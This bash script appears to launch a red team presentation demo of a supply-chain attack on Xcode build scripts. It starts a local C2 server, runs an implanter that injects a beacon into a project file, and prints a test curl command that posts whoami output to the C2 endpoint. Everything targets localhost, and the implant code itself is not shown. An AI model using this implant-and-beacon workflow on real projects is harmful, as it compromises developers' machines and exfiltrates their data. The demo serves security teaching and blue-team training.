#!/usr/bin/env bash
#
# RED TEAM DEMO - Quick Demo Runner
# ==================================
# One-command demo launcher for presentations.
#
# Usage:
#     ./run_demo.sh [C2_PORT]
#

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
DEMO_ROOT="$(dirname "$SCRIPT_DIR")"
C2_PORT="${1:-8888}"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

clear

echo -e "${RED}"
cat << 'BANNER'
   ____  _____ ____    _____ _____    _    __  __   ____  _____ __  __  ___  
  |  _ \| ____|  _ \  |_   _| ____|  / \  |  \/  | |  _ \| ____|  \/  |/ _ \ 
  | |_) |  _| | | | |   | | |  _|   / _ \ | |\/| | | | | |  _| | |\/| | | | |
  |  _ <| |___| |_| |   | | | |___ / ___ \| |  | | | |_| | |___| |  | | |_| |
  |_| \_\_____|____/    |_| |_____/_/   \_\_|  |_| |____/|_____|_|  |_|\___/ 
                                                                              
              Supply Chain Attack via Xcode Build Scripts
BANNER
echo -e "${NC}"

echo -e "${YELLOW}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}  FOR EDUCATIONAL PURPOSES ONLY - RED TEAM VS BLUE TEAM        ${NC}"
echo -e "${YELLOW}═══════════════════════════════════════════════════════════════${NC}"
echo ""

# Check for virtual environment
if [ ! -d "$DEMO_ROOT/.venv" ]; then
    echo -e "${RED}[!] Virtual environment not found. Run setup.sh first.${NC}"
    echo "    cd $DEMO_ROOT/scripts && ./setup.sh"
    exit 1
fi

# Activate virtual environment
source "$DEMO_ROOT/.venv/bin/activate"

# Create demo artifacts directory
mkdir -p /tmp/redteam_demo

echo -e "${CYAN}[STAGE 1] Starting C2 Server...${NC}"
echo -e "${BLUE}           Port: $C2_PORT${NC}"
echo -e "${BLUE}           Dashboard: http://localhost:$C2_PORT/admin${NC}"
echo ""

# Start C2 in background
python3 "$DEMO_ROOT/c2_server/c2_server.py" --port "$C2_PORT" &
C2_PID=$!

# Wait for C2 to start
sleep 2

# Check if C2 is running
if ! kill -0 $C2_PID 2>/dev/null; then
    echo -e "${RED}[!] Failed to start C2 server${NC}"
    exit 1
fi

echo -e "${GREEN}[+] C2 Server running (PID: $C2_PID)${NC}"
echo ""

echo -e "${CYAN}[STAGE 2] Demo Project Status...${NC}"

# Check for demo project
DEMO_PROJECT=""
if [ -d "$DEMO_ROOT/demo_project" ]; then
    DEMO_PROJECT=$(find "$DEMO_ROOT/demo_project" -name "*.xcodeproj" -type d | head -1)
fi

if [ -n "$DEMO_PROJECT" ]; then
    echo -e "${GREEN}[+] Demo project found: $DEMO_PROJECT${NC}"
    
    # Check if already implanted
    if grep -q "RED_TEAM_DEMO_IMPLANT" "$DEMO_PROJECT/project.pbxproj" 2>/dev/null; then
        echo -e "${YELLOW}[*] Project already implanted${NC}"
    else
        echo -e "${BLUE}[*] Implanting project...${NC}"
        python3 "$DEMO_ROOT/xcode_implant/implant_xcode_project.py" \
            --project "$DEMO_PROJECT" \
            --c2 "http://localhost:$C2_PORT" \
            --beacon-id "demo"
    fi
else
    echo -e "${YELLOW}[!] No demo project found${NC}"
    echo "    Run setup.sh to create one, or provide your own"
fi

echo ""
echo -e "${GREEN}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}                    DEMO READY                                  ${NC}"
echo -e "${GREEN}═══════════════════════════════════════════════════════════════${NC}"
echo ""
echo "  C2 Dashboard:    http://localhost:$C2_PORT/admin"
echo "  Beacon Endpoint: http://localhost:$C2_PORT/s/<beacon_id>"
echo "  Demo Artifacts:  /tmp/redteam_demo/"
echo ""
echo "  To test manually:"
echo -e "    ${YELLOW}curl -X POST http://localhost:$C2_PORT/s/test -d 'p=macos&u=\$(whoami)'${NC}"
echo ""
if [ -n "$DEMO_PROJECT" ]; then
    echo "  To trigger via Xcode:"
    echo -e "    ${YELLOW}open $DEMO_PROJECT${NC}"
    echo "    Then press Cmd+B to build"
    echo ""
fi
echo -e "${CYAN}Press Ctrl+C to stop the demo...${NC}"
echo ""

# Cleanup on exit
cleanup() {
    echo ""
    echo -e "${YELLOW}[*] Shutting down...${NC}"
    kill $C2_PID 2>/dev/null || true
    echo -e "${GREEN}[+] Demo stopped${NC}"
    exit 0
}

trap cleanup SIGINT SIGTERM

# Keep running
wait $C2_PID
